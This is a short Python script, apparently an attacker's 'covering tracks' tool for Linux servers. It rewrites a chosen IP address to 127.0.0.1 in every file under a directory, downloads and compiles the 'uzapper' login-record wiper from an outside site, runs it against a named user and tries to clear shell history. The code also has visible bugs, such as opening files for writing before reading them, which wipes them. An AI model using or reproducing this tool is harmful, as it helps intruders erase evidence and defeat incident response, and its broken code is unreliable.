#!/usr/bin/python
# Reference - https://infosec.zerobyte.id/covering-track-menjadi-hantu-pada-linux-server/
# Rewrite In Python Code
# By R&D ICWR

import os,sys,requests

def replace_ip(xpath,ip):
    for x in os.scandir(path=xpath):
        if os.path.isfile(xpath+x):
            try:
                f=open(xpath+x,"w")
                f.write(open(x,"r").read().replace(ip,"127.0.0.1"))
                f.close()
            except:
                pass
        else:
            replace_ip(xpath+x,ip)

if len(sys.argv)<3:
    print("Invalid")
    exit()

replace_ip(sys.argv[1],sys.argv[2])

x=requests.get(url="https://packetstormsecurity.com/files/download/16378/uzapper.c")

f=open("uzapper.c","w")
f.write(x.content)
f.close()

os.system("w")

os.system("gcc uzapper.c -o uzapper | chmod 777 uzapper")
os.system("./uzapper %s"%(sys.argv[3]))
os.system("w")

os.system("HISTFILE=/dev/null")
os.system("history -c")
